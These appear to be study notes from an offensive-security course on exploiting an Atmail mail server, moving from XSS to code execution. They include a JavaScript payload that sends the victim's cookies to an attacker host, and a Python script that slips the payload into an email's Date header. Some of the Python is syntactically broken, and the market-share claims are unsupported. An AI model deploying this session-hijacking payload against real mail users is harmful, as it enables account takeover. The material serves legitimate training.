# WEB-300: Atmail eMail Server Appliance: from XSS to RCE
The idea is mailservers can be vulnerable to xss, if you send a payload in the date or subject or body as form of iframe or javascript, you canexploit the vulnerability. Note: 99% of the world use about 4 main mail platforms, with gmail and outlook and yahoo basically accounting for over 90% and protonmail 8%. So, everything explained here is mostly theoretical. All mail servers won't accept iframe and the fields are sanitized. So, the only trick you have is still to trick people out of the mail through links. 

## session hijacking
```javascript
function addImage(){
  var img = document.createElement('img');
  img.src = "http://attacker-ip:port/"+document.cookie;
  document.body.appendChild(img);
}

addImage();
```

## sending the payload
```python
import smtplib

def sendEmail(to,from,smtpsrv,payload):
  msg = 'From: attacker@mail.com\n'
  msg += To: victim@mail.com\n'
  msg += f'Date: {payload}\n'
  msg += 'Subject: pwnd\n'
  msg += 'Content-type: text/html\n\n'
  msg += 'something something something'
  msg += '\r\n\r\n'

  server = smtplib.SMTP(smtpsrv)
  try:
    server.sendmail(to, from, msg)
  except:
    pass
  server.quit()
```
